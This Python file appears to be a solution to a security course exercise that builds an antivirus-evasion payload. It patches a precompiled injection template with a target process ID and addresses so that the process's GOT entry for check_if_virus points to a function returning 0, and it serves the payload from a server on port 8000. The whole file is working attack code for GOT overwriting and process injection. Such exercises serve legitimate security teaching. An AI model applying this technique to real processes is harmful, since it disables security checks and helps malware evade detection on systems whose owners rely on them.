import addresses as ad
import evasion
import struct


class SolutionServer(evasion.EvadeAntivirusServer):

    def get_payload(self, pid: int) -> bytes:
        """Returns a payload to replace the GOT entry for check_if_virus.

        Reminder: We want to replace it with another function of a similar
        signature, that will return 0.

        Notes:
        1. You can assume we already compiled q3.c into q3.template.
        2. Use addresses.CHECK_IF_VIRUS_GOT, addresses.CHECK_IF_VIRUS_ALTERNATIVE
           (and addresses.address_to_bytes).

        Returns:
             The bytes of the payload.
        """
        PATH_TO_TEMPLATE = './q3.template'
        template_file = open(PATH_TO_TEMPLATE, 'rb')
        template_data = template_file.read()
        template_file.close()

        # Find pid and address
        pid_address = template_data.find(b"\x78\x56\x34\x12")
        virus_got_ph = template_data.find(b"\x21\x43\x65\x87")
        patch_ph = template_data.find(b"\x99\x99\x99\x99")

        # Create a list of opcodes in decimal from patches
        pid_bytes = list(struct.pack('<I', pid))
        virus_got_bytes = list(ad.address_to_bytes(ad.CHECK_IF_VIRUS_GOT))
        alt_func_bytes = list(ad.address_to_bytes(ad.CHECK_IF_VIRUS_ALTERNATIVE))

        # Patching
        template_bytes_list = list(template_data)
        template_bytes_list[pid_address:pid_address+len(pid_bytes)] = pid_bytes
        template_bytes_list[patch_ph:patch_ph+len(alt_func_bytes)] = alt_func_bytes
        template_bytes_list[virus_got_ph:virus_got_ph+len(virus_got_bytes)] = virus_got_bytes
        return bytes(template_bytes_list)

    def print_handler(self, product: bytes):
        # WARNING: DON'T EDIT THIS FUNCTION!
        print(product.decode('latin-1'))

    def evade_antivirus(self, pid: int):
        # WARNING: DON'T EDIT THIS FUNCTION!
        self.add_payload(
            self.get_payload(pid),
            self.print_handler)


if __name__ == '__main__':
    SolutionServer().run_server(host='0.0.0.0', port=8000)
